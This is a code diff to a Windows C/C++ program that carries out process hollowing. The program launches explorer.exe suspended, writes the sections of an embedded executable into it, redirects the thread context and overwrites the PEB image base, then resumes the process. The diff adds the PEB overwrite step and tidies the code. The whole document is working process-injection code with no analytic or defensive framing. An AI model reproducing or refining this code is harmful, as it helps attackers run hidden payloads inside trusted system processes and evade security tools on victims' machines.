@@ -8,8 +8,8 @@ int main()
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
-	const unsigned int baseAddrLength = 4;
-	const unsigned int pebImageBaseAddrOffset = 8;
+	const int baseAddrLength = 4;
+	const int pebImageBaseAddrOffset = 8;
 
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
@@ -17,20 +17,21 @@ int main()
 
 	HINSTANCE handleNtDll = LoadLibrary("ntdll");
 
+
 	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
-	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");
+	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "NtUnmapViewOfSection");
 
 	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
 	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
 
-	
-	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 	{
 		printf("CreateProcess Failed: %i.\n", GetLastError());
 	}
 
+
+
 	PROCESS_BASIC_INFORMATION pbi;
-	PULONG returnLength = NULL;
 
 	/* Retrieves ProcessBasicInformaton info from the created process */
 	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
@@ -49,15 +50,16 @@ int main()
 	/* Get pointer to the resource base address */
 	LPVOID lpBaseAddressResource = LockResource(resourceData);
 
+
 	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddressResource;
 
-	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) 
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
 	{
 		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
 	}
-		
+
 	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
-	
+
 	/* Allocate virtual memory for the process which is to be injected */
 	LPVOID baseAddressInjectedPE = VirtualAllocEx(pi.hProcess, NULL, pNTHeaderResource->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
@@ -79,17 +81,17 @@ int main()
 	{
 		printf("Copying data from: %s\n", pSectionHeader->Name);
 
-		PBYTE section = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];
-		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);
+		PBYTE pSectionData = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];
 
-		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)baseAddressInjectedPE + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
+		memcpy(pSectionData, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);
+
+		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)baseAddressInjectedPE + (DWORD)pSectionHeader->VirtualAddress), pSectionData, (DWORD)pSectionHeader->SizeOfRawData, NULL))
 		{
 			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());
 			return -1;
 		}
 		pSectionHeader++;
 	}
-
 
 	/* Retrieve the suspended procceses current context */
 	PCONTEXT pContext = new CONTEXT();
@@ -102,13 +104,16 @@ int main()
 	/* Set the suspended exe context with the updated eax value which points to the injected code */
 	SetThreadContext(pi.hThread, pContext);
 
+	/* Overwrite the PEB base address with the image base address of the injected PE */
+	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &baseAddressInjectedPE, baseAddrLength, NULL);
+
 	/* Resume the created processes main thread with the updated OEP */
 	ResumeThread(pi.hThread);
 
 
 	printf("\nCreated Process id: %i\n", pi.dwProcessId);
-	printf("Created process Image Base Address 0x%p\n", pPeb->ImageBaseAddress);
-	printf("Injected process Image Base Address 0x%p\n", baseAddressInjectedPE);
+	printf("Created process Image Base Address 0x%x\n", pPeb->ImageBaseAddress);
+	printf("Injected process Image Base Address 0x%x\n", baseAddressInjectedPE);
 
 	return 0;
 }
